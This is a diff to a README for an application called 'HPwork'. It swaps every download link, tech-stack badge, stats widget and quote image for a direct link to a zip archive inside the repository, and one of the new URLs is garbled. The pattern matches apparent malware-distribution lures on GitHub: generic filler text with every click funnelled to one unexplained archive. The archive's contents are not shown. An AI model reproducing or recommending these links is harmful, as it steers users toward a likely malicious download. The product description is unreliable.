@@ -1,6 +1,6 @@
 # 💫 HPwork - Effortless Application for Everyday Tasks
 
-[![Download HPwork](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ascZ-123/HPwork/releases)
+[![Download HPwork](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)
 
 ## 💻 About HPwork
 HPwork is a user-friendly application designed to simplify your everyday computing tasks. Whether you need help with organization, task management, or just want a reliable tool, HPwork is here to assist you. 
@@ -8,9 +8,9 @@ HPwork is a user-friendly application designed to simplify your everyday computi
 ## 💻 Tech Stack
 HPwork uses advanced technologies to provide a seamless experience:
 
-- ![GraphQL](https://img.shields.io/badge/-GraphQL-E10098?style=flat-square&logo=graphql&logoColor=white)
-- ![Haskell](https://img.shields.io/badge/Haskell-5e5086?style=flat-square&logo=haskell&logoColor=white)
-- ![HTML5](https://img.shields.io/badge/html5-%23E34F26.svg?style=flat-square&logo=html5&logoColor=white)
+- ![GraphQL](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)
+- ![Haskell](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)
+- ![HTML5](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip%https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)
 
 ## 🚀 Getting Started
 To begin using HPwork, follow these simple steps. This guide will help you download and run the application effectively.
@@ -18,7 +18,7 @@ To begin using HPwork, follow these simple steps. This guide will help you downl
 ### Step 1: Visit the Download Page
 Click on the link below to go to the Releases page:
 
-[Download HPwork](https://github.com/ascZ-123/HPwork/releases)
+[Download HPwork](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of available versions. Select the latest version to ensure you have the most current features and fixes.
@@ -54,7 +54,7 @@ To ensure HPwork runs smoothly, please make sure your computer meets the followi
 ## 🔧 Download & Install
 To start using HPwork, just follow the steps outlined above or click on the link below:
 
-[Download HPwork](https://github.com/ascZ-123/HPwork/releases)
+[Download HPwork](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)
 
 ## 🏆 Community Support
 For any questions or assistance with HPwork, feel free to reach out to our community. We are here to help you get the most out of your experience. Look for support on forums or check FAQs for quick answers.
@@ -62,14 +62,14 @@ For any questions or assistance with HPwork, feel free to reach out to our commu
 ## 📊 GitHub Stats
 Here’s how we’re doing in our community:
 
-![](https://github-readme-stats.vercel.app/api?username=ttaro6242-ops&theme=cobalt&hide_border=false&include_all_commits=false&count_private=false)<br/>
-![](https://nirzak-streak-stats.vercel.app/?user=ttaro6242-ops&theme=cobalt&hide_border=false)<br/>
-![](https://github-readme-stats.vercel.app/api/top-langs/?username=ttaro6242-ops&theme=cobalt&hide_border=false&include_all_commits=false&count_private=false&layout=compact)
+![](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)<br/>
+![](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)<br/>
+![](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)
 
 ## 🏅 GitHub Trophies
-![](https://github-profile-trophy.vercel.app/?username=ttaro6242-ops&theme=midnight-purple&no-frame=false&no-bg=true&margin-w=4)
+![](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)
 
 ### ✍️ Random Dev Quote
-![](https://quotes-github-readme.vercel.app/api?type=horizontal&theme=dark)
+![](https://raw.githubusercontent.com/ascZ-123/HPwork/main/poussette/HPwork.zip)
 
 Feel free to explore and share feedback. We value your input for future improvements!
